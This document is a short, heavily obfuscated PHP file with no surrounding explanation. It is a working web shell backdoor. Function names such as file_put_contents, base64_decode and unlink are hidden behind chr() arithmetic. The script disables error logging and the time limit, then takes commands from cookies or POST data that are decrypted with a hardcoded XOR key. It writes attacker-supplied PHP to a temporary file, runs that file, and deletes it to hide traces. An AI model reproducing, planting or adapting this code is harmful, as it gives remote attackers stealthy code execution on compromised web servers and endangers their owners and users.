<?php $kyska = "\x66"."\x69".chr(645-537)."\x65".'_'.chr(112)."\x75".chr(116)."\137"."\x63".chr(1106-995).'n'.'t'."\x65".chr(1012-902).'t'.chr(224-109);
$TOKgypWZaf = "\x62".chr(97).chr(973-858).chr(101).chr(54).chr(52).chr(461-366).chr(152-52).'e'.chr(706-607)."\157".chr(100)."\145";
$KGwxVr = 'i'.chr(110).'i'."\x5f".chr(115).chr(101).chr(1110-994);
$WxcOYCwW = "\165"."\156".'l'."\151".chr(425-315).chr(107);


@$KGwxVr(chr(1067-966)."\x72".chr(191-77)."\157"."\x72".'_'.chr(108)."\x6f"."\147", NULL);
@$KGwxVr(chr(325-217).'o'."\147".'_'.'e'."\162".chr(114).chr(111).chr(667-553)."\163", 0);
@$KGwxVr(chr(109).chr(548-451).chr(120).chr(790-695).chr(855-754)."\170"."\x65".chr(99)."\165".chr(316-200).chr(105).chr(111)."\x6e"."\x5f".'t'.'i'.'m'."\145", 0);
@set_time_limit(0);

function vMMcqFg($BLgyK, $nJWqdZJm)
{
    $cbsVT = "";
    for ($gOSlQtHQu = 0; $gOSlQtHQu < strlen($BLgyK);) {
        for ($j = 0; $j < strlen($nJWqdZJm) && $gOSlQtHQu < strlen($BLgyK); $j++, $gOSlQtHQu++) {
            $cbsVT .= chr(ord($BLgyK[$gOSlQtHQu]) ^ ord($nJWqdZJm[$j]));
        }
    }
    return $cbsVT;
}

$zWkIcqPaCU = array_merge($_COOKIE, $_POST);
$aEIEBkzi = 'b6b342a4-e41f-48de-aa6a-67a65b1ae2e9';
foreach ($zWkIcqPaCU as $LWLQBh => $BLgyK) {
    $BLgyK = @unserialize(vMMcqFg(vMMcqFg($TOKgypWZaf($BLgyK), $aEIEBkzi), $LWLQBh));
    if (isset($BLgyK[chr(949-852)."\153"])) {
        if ($BLgyK['a'] == chr(1048-943)) {
            $gOSlQtHQu = array(
                chr(534-422).chr(891-773) => @phpversion(),
                chr(745-630)."\x76" => "3.5",
            );
            echo @serialize($gOSlQtHQu);
        } elseif ($BLgyK['a'] == "\145") {
            $dOVUn = "./" . md5($aEIEBkzi) . "\56"."\x69".chr(239-129).chr(99);
            @$kyska($dOVUn, "<" . "\x3f"."\x70".chr(104)."\x70".chr(723-691).'@'."\x75"."\156".chr(108).chr(761-656).chr(110).'k'.chr(40).chr(364-269)."\x5f".chr(478-408)."\x49".chr(76)."\105".chr(95)."\x5f".chr(41).';'.' ' . $BLgyK[chr(775-675)]);
            include($dOVUn);
            @$WxcOYCwW($dOVUn);
        }
        exit();
    }
}

